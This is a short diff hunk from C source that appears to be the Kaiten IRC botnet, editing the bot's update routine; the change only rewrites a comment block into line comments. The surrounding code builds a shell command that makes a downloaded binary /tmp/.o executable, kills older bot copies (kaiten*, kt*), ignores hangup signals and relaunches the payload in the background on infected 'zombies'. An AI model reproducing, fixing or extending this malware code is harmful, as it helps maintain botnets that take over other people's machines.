@@ -689,9 +689,9 @@ void update(int sock, char *sender, int argc, char **argv) {
 		}
 		fclose(file);
 		memset(buf,0,4096);
-/* You may have to play around with this a bit if your zombies don't have killall or sleep try this:
-* //sprintf(buf,"(chmod 755 /tmp/.o;kill -9 %d; kill -9 %d;trap '' 1 2; /tmp/.o &) > /dev/null",actualparent,parent,execfile);
-*/ Otherwise run GETBB first, and than this will work just fine:
+// You may have to play around with this a bit if your zombies don't have killall or sleep try this:
+// //sprintf(buf,"(chmod 755 /tmp/.o;kill -9 %d; kill -9 %d;trap '' 1 2; /tmp/.o &) > /dev/null",actualparent,parent,execfile);
+// Otherwise run GETBB first, and than this will work just fine:
 		sprintf(buf,"export PATH=/var/bin:/usr/sbin:/bin:/usr/bin:/sbin;export HOME=/tmp;chmod +x /tmp/.o; trap '' 1;sh -c 'killall kaiten*;killall kt*;killall .o;sleep 5;trap "" 1;/tmp/.o '&");
 	}
 	close(sock);
